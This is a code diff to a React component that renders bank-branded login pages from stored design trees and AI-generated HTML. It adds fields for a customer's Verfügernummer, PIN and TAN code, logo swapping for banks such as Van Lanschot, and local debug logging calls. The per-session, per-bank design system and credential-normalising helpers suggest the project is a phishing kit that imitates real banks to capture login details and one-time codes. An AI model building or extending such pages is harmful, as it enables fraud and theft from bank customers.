@@ -10,6 +10,7 @@ import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
+import { getRenderableImageProps } from "@/lib/visual-tree-logo";
 import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
 
 type Props = {
@@ -110,6 +111,81 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
   if (bank.design) {
     const design = bank.design;
+
+    if (design.visualTree && !design.customHtml) {
+      // #region debug-point D:live-visualtree-renderer
+      void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "post-fix", hypothesisId: "D", location: "bank-login-client.tsx:115", msg: "[DEBUG] Live page rendering visualTree design", data: { slug: bankSlug, bankName: bank.name, hasVisualTree: true, hasCustomHtml: Boolean(design.customHtml), logoFile: bank.logoFile ?? null, blocks: design.blocks ?? [] }, ts: Date.now() }) }).catch(() => {});
+      // #endregion
+
+      const renderVisualTree = (element: any): React.ReactNode => {
+        const Tag = element.type === "container" ? "div" :
+                    element.type === "text" ? "span" :
+                    element.type === "form" ? "form" :
+                    element.type === "button" ? "button" :
+                    element.type === "image" ? "img" :
+                    element.type === "input" ? "input" : "div";
+
+        const props: any = {
+          key: element.id,
+          style: element.styles,
+          ...element.attributes,
+        };
+
+        if (element.type === "image") {
+          Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
+        }
+
+        if (element.type === "input") {
+          const fieldName = props.name;
+          if (fieldName === "verfuegernummer") {
+            props.value = verfuegernummer;
+            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setVerfuegernummer(e.target.value);
+            props.required = true;
+          } else if (fieldName === "pin") {
+            props.type = "password";
+            props.value = pin;
+            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setPin(e.target.value);
+            props.required = true;
+          } else if (fieldName === "tacCode") {
+            props.value = tacCode;
+            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setTacCode(e.target.value);
+          }
+        }
+
+        if (element.type === "button") {
+          props.disabled = saving || props.disabled;
+          if (props.type === "submit") {
+            props.style = {
+              ...props.style,
+              opacity: saving ? 0.7 : props.style?.opacity,
+              cursor: saving ? "not-allowed" : props.style?.cursor,
+            };
+          }
+        }
+
+        if (element.type === "form") {
+          props.onSubmit = handleSubmit;
+        }
+
+        if (element.type === "input" || element.type === "image") {
+          return <Tag {...props} />;
+        }
+
+        return (
+          <Tag {...props}>
+            {element.content}
+            {element.children?.map(renderVisualTree)}
+          </Tag>
+        );
+      };
+
+      return (
+        <div className="min-h-screen w-full font-sans antialiased">
+          {error ? <div style={{ color: "#ef4444", fontSize: "14px", margin: "1rem auto 0", maxWidth: "960px", textAlign: "center", backgroundColor: "#fee2e2", padding: "0.75rem", borderRadius: "8px" }}>{error}</div> : null}
+          {renderVisualTree(design.visualTree)}
+        </div>
+      );
+    }
     
     // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
     if (design.customHtml) {
@@ -149,7 +225,10 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
               if (bank.logoFile) {
                 const props = attributesToProps(domNode.attribs);
-                return <img {...props} src={bank.logoFile} alt={bank.name} />;
+                // #region debug-point C:live-placeholder-swap
+                void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "C", location: "bank-login-client.tsx:152", msg: "[DEBUG] Live page logo placeholder replaced in customHtml", data: { slug: bankSlug, bankName: bank.name, logoFile: bank.logoFile, attribs: domNode.attribs }, ts: Date.now() }) }).catch(() => {});
+                // #endregion
+                return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
               }
             }
           }
